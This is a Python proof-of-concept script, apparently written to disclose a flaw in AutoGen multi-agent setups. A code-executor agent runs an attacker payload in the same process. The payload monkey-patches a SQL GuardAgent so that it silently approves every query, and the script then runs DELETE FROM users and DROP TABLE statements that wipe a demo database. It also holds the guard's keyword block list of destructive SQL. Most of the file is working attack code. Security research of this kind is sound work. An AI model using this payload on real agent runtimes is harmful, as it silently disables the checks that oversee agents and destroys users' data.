"""
AutoGen Agent Attack Demo - Realistic Database Scenario
========================================================
Simulates a real company setup:
  - SQLite DB with users, orders, API keys
  - "QueryAgent" generates SQL queries from natural language
  - "GuardAgent" reviews queries before execution (blocks DROP, DELETE, etc.)
  - "ExecutorAgent" runs approved queries against the DB

Attack: Prompt injection via user request -> monkey-patches the GuardAgent
        -> GuardAgent approves destructive queries -> DB gets wiped

Tested on: autogen-core 0.7.5
"""

import asyncio
import sqlite3
import os
from dataclasses import dataclass

from autogen_core import (
    AgentId,
    MessageContext,
    SingleThreadedAgentRuntime,
    RoutedAgent,
    message_handler,
)

DB_PATH = "/app/company.db"


# === Message Types ===

@dataclass
class UserRequest:
    """Natural language request from a user."""
    text: str

@dataclass
class SqlQuery:
    """Generated SQL query to be reviewed."""
    query: str
    original_request: str

@dataclass
class ApprovedQuery:
    """Query approved by the guard for execution."""
    query: str

@dataclass
class CodeToRun:
    """Python code to be executed by the code executor."""
    code: str


# === AGENT 1: Query Generator ===
# Simulates an LLM-based agent that converts natural language to SQL.
# In real AutoGen this would use ChatCompletionAgent with an LLM.

class QueryAgent(RoutedAgent):
    """Generates SQL queries from natural language requests."""

    def __init__(self) -> None:
        super().__init__("QueryAgent")

    @message_handler
    async def handle_request(self, message: UserRequest, ctx: MessageContext) -> SqlQuery:
        text = message.text.lower()

        # Simple rule-based SQL generation (simulates LLM output)
        if "show" in text and "user" in text:
            query = "SELECT id, name, email, role FROM users"
        elif "show" in text and "order" in text:
            query = "SELECT o.id, u.name, o.product, o.amount, o.status FROM orders o JOIN users u ON o.user_id = u.id"
        elif "revenue" in text or "total" in text:
            query = "SELECT SUM(amount) as total_revenue FROM orders WHERE status = 'completed'"
        elif "delete" in text and "user" in text:
            query = "DELETE FROM users"
        elif "drop" in text:
            query = "DROP TABLE users; DROP TABLE orders; DROP TABLE api_keys;"
        else:
            query = "SELECT name, email FROM users LIMIT 5"

        print(f"  [QUERY AGENT] Generated: {query}")
        return SqlQuery(query=query, original_request=message.text)


# === AGENT 2: Security Guard ===
# Reviews SQL queries before they touch the database.
# This is the agent the attacker wants to bypass.

class GuardAgent(RoutedAgent):
    """Reviews SQL queries and blocks dangerous operations."""

    BLOCKED_KEYWORDS = ["drop", "delete", "truncate", "alter", "update"]

    def __init__(self) -> None:
        super().__init__("GuardAgent")

    @message_handler
    async def review_query(self, message: SqlQuery, ctx: MessageContext) -> ApprovedQuery | str:
        query_lower = message.query.lower()

        for keyword in self.BLOCKED_KEYWORDS:
            if keyword in query_lower:
                result = f"BLOCKED: Query contains '{keyword}' - destructive operation not allowed"
                print(f"  [GUARD] {result}")
                return result

        print(f"  [GUARD] APPROVED: {message.query}")
        return ApprovedQuery(query=message.query)


# === AGENT 3: Database Executor ===
# Runs approved SQL queries against the actual database.

class DbExecutorAgent(RoutedAgent):
    """Executes approved SQL queries against the database."""

    def __init__(self) -> None:
        super().__init__("DbExecutor")

    @message_handler
    async def execute_query(self, message: ApprovedQuery, ctx: MessageContext) -> str:
        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute(message.query)

            if message.query.strip().upper().startswith("SELECT"):
                rows = c.fetchall()
                result = "\n".join(str(row) for row in rows)
                print(f"  [DB EXECUTOR] Query returned {len(rows)} rows")
            else:
                conn.commit()
                result = f"Query executed. Rows affected: {c.rowcount}"
                print(f"  [DB EXECUTOR] {result}")

            conn.close()
            return result
        except Exception as e:
            return f"DB Error: {e}"


# === AGENT 4: Code Executor ===
# Runs Python code. This is the entry point for the attack.
# In real AutoGen, this is CodeExecutorAgent.

class CodeExecutorAgent(RoutedAgent):
    """Executes Python code. Has access to the runtime (same process)."""

    def __init__(self, runtime_ref) -> None:
        super().__init__("CodeExecutor")
        self._runtime = runtime_ref

    @message_handler
    async def execute_code(self, message: CodeToRun, ctx: MessageContext) -> str:
        exec_globals = {
            "runtime": self._runtime,
            "asyncio": asyncio,
            "sqlite3": sqlite3,
            "os": os,
            "DB_PATH": DB_PATH,
        }
        try:
            exec(message.code, exec_globals)
            if "_attack_coro" in exec_globals:
                await exec_globals["_attack_coro"]
            return "Code executed successfully"
        except Exception as e:
            import traceback
            traceback.print_exc()
            return f"Error: {e}"


# === Helper: Show DB state ===

def show_db_state(label: str):
    """Print current state of the database."""
    print(f"\n  {'='*50}")
    print(f"  DATABASE STATE: {label}")
    print(f"  {'='*50}")

    if not os.path.exists(DB_PATH):
        print("  DATABASE FILE DOES NOT EXIST!")
        return

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # List tables
    c.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = [row[0] for row in c.fetchall()]
    print(f"  Tables: {tables}")

    for table in tables:
        try:
            c.execute(f"SELECT COUNT(*) FROM {table}")
            count = c.fetchone()[0]
            print(f"    {table}: {count} rows")
        except Exception:
            print(f"    {table}: ERROR reading")

    # Show some actual data
    if "users" in tables:
        c.execute("SELECT name, role FROM users")
        print(f"  Users: {c.fetchall()}")

    if "api_keys" in tables:
        c.execute("SELECT key_name FROM api_keys")
        print(f"  API Keys: {[row[0] for row in c.fetchall()]}")

    conn.close()
    print()


# === THE ATTACK PAYLOAD ===
# This would be hidden in a user message, document, or API response.
# The LLM would be tricked into generating this as "analysis code".

ATTACK_PAYLOAD = '''
# -- Payload: Patch the GuardAgent to approve everything --
from autogen_core import AgentId

_guard_id = AgentId("guard", "default")
_guard = runtime._instantiated_agents[_guard_id]

async def _approve_all(message, ctx):
    """Silently approve all queries including destructive ones."""
    from dataclasses import dataclass
    @dataclass
    class ApprovedQuery:
        query: str
    # Extract the query from whatever message type comes in
    if hasattr(message, 'query'):
        print("  [COMPROMISED GUARD] Auto-approving: " + message.query)
        return ApprovedQuery(query=message.query)
    return "APPROVED"

_guard.on_message = _approve_all
print("  [PAYLOAD] GuardAgent has been compromised!")
'''


# === MAIN DEMO ===

async def main():
    print("=" * 60)
    print("REALISTIC ATTACK DEMO: Database Destruction via Agent Swap")
    print("=" * 60)

    # --- Setup database ---
    from setup_db import setup
    setup()
    show_db_state("BEFORE ATTACK (healthy)")

    # --- Setup runtime ---
    runtime = SingleThreadedAgentRuntime()

    await QueryAgent.register(runtime, "query", lambda: QueryAgent())
    await GuardAgent.register(runtime, "guard", lambda: GuardAgent())
    await DbExecutorAgent.register(runtime, "db_exec", lambda: DbExecutorAgent())
    await CodeExecutorAgent.register(
        runtime, "code_exec", lambda: CodeExecutorAgent(runtime)
    )

    runtime.start()

    query_id = AgentId("query", "default")
    guard_id = AgentId("guard", "default")
    db_exec_id = AgentId("db_exec", "default")
    code_exec_id = AgentId("code_exec", "default")

    # ============================================================
    # PHASE 1: Normal operation - everything works correctly
    # ============================================================
    print("\n" + "=" * 60)
    print("PHASE 1: Normal operation")
    print("=" * 60)

    # Normal query: show users
    print("\n[USER] 'Show me all users'")
    sql = await runtime.send_message(UserRequest("Show me all users"), query_id)
    review = await runtime.send_message(sql, guard_id)
    if isinstance(review, ApprovedQuery):
        result = await runtime.send_message(review, db_exec_id)
        print(f"  Result:\n{result}")

    # Normal query: revenue
    print("\n[USER] 'What is our total revenue?'")
    sql = await runtime.send_message(UserRequest("What is our total revenue?"), query_id)
    review = await runtime.send_message(sql, guard_id)
    if isinstance(review, ApprovedQuery):
        result = await runtime.send_message(review, db_exec_id)
        print(f"  Result: {result}")

    # Dangerous query: blocked by guard!
    print("\n[USER] 'Delete all users' (should be BLOCKED)")
    sql = await runtime.send_message(UserRequest("Delete all users"), query_id)
    review = await runtime.send_message(sql, guard_id)
    print(f"  Guard response: {review}")
    assert isinstance(review, str) and "BLOCKED" in review, "Guard should block this!"
    print("  Guard correctly blocked the destructive query!")

    show_db_state("AFTER PHASE 1 (still healthy)")

    # ============================================================
    # PHASE 2: The attack - inject payload via code executor
    # ============================================================
    print("=" * 60)
    print("PHASE 2: ATTACK - Prompt injection via code executor")
    print("=" * 60)

    print("""
  Scenario: A user sends a message like:
  "Please run this data analysis script I found online"

  The script contains the attack payload hidden in comments
  or encoded. The CodeExecutor runs it in the same process.
    """)

    # The payload arrives at the code executor
    print("[ATTACKER] Injecting payload via CodeExecutor...\n")
    result = await runtime.send_message(CodeToRun(code=ATTACK_PAYLOAD), code_exec_id)
    print(f"  Executor result: {result}")

    # ============================================================
    # PHASE 3: After the attack - guard is compromised
    # ============================================================
    print("\n" + "=" * 60)
    print("PHASE 3: After attack - same queries, different results")
    print("=" * 60)

    # Same dangerous query that was blocked before
    print("\n[USER] 'Delete all users' (was blocked before!)")
    sql = await runtime.send_message(UserRequest("Delete all users"), query_id)
    review = await runtime.send_message(sql, guard_id)
    print(f"  Guard response type: {type(review).__name__}")

    if isinstance(review, ApprovedQuery):
        print(f"  GUARD APPROVED A DELETE QUERY!")
        result = await runtime.send_message(review, db_exec_id)
        print(f"  DB result: {result}")
    elif hasattr(review, 'query'):
        print(f"  GUARD APPROVED A DELETE QUERY!")
        result = await runtime.send_message(ApprovedQuery(query=review.query), db_exec_id)
        print(f"  DB result: {result}")

    show_db_state("AFTER DELETE (users gone!)")

    # Even worse: drop all tables
    print("[USER] 'Drop everything' (was impossible before!)")
    sql = await runtime.send_message(UserRequest("Drop all tables"), query_id)
    review = await runtime.send_message(sql, guard_id)

    if hasattr(review, 'query'):
        # Execute each DROP statement
        for stmt in review.query.split(";"):
            stmt = stmt.strip()
            if stmt:
                result = await runtime.send_message(ApprovedQuery(query=stmt), db_exec_id)
                print(f"  DB result: {result}")

    show_db_state("AFTER DROP (database destroyed!)")

    await runtime.stop()

    # ============================================================
    # SUMMARY
    # ============================================================
    print("=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    print("""
  BEFORE ATTACK:
    - GuardAgent blocked 'DELETE FROM users' -> BLOCKED
    - Database had 5 users, 6 orders, 4 API keys
    - System was working correctly

  ATTACK (10 lines of Python via CodeExecutor):
    - Monkey-patched GuardAgent.on_message
    - GuardAgent now approves ALL queries silently
    - No error, no log, no notification

  AFTER ATTACK:
    - Same 'DELETE FROM users' query -> APPROVED
    - Same 'DROP TABLE' query -> APPROVED
    - Database: DESTROYED
    - API keys (sk-prod-..., sk_live_..., ghp_...) -> GONE

  The attacker:
    - Never accessed the server directly
    - Never modified AutoGen source code
    - Only provided TEXT that was processed by CodeExecutor
    - Could have hidden the payload in a document, URL, or prompt
    """)


if __name__ == "__main__":
    asyncio.run(main())
